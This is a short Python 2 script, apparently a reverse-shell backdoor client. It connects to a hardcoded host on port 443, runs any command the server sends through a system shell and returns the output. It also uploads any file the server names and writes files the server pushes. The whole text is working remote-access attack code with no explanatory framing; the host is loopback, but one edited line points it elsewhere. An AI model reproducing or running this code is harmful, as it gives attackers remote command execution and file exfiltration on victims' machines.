import os
import socket
import subprocess
import sys

host = '127.0.0.1'
port = 443

def connect():
    # Create socket & connect to server
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

# CWD Shell Prompt
# cwd = os.getcwd()
# s.send(cwd)


def main():
    while True:
        srv_cmd = s.recv(1024)
        if srv_cmd == "quit":
            print "[-] Interactive Mode Disabled"
        elif srv_cmd == "disconnect":
            print "[-] Disconnecting from server"
            s.close()
            exit()
        # Send File
        elif srv_cmd == "snd_file":
            name_f = s.recv(1024)
            print "Sending File: ", name_f
            snd_f = open(name_f, "rb")
            read = snd_f.read()
            s.send(read)
        # Recover File
        elif srv_cmd == "rcv_file":
            rcv_f = open("newserverfile.txt", "wb+")
            data_f = s.recv(4096)
            rcv_f.write(data_f)
            rcv_f.close()
            print "[+] Retrieved File: ", data_f
        # Interactive Shell
        else:
            cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            output = cmd.stdout.read() + cmd.stderr.read()
            s.send(output)
            cmd.terminate()

    s.close()

connect()
main()
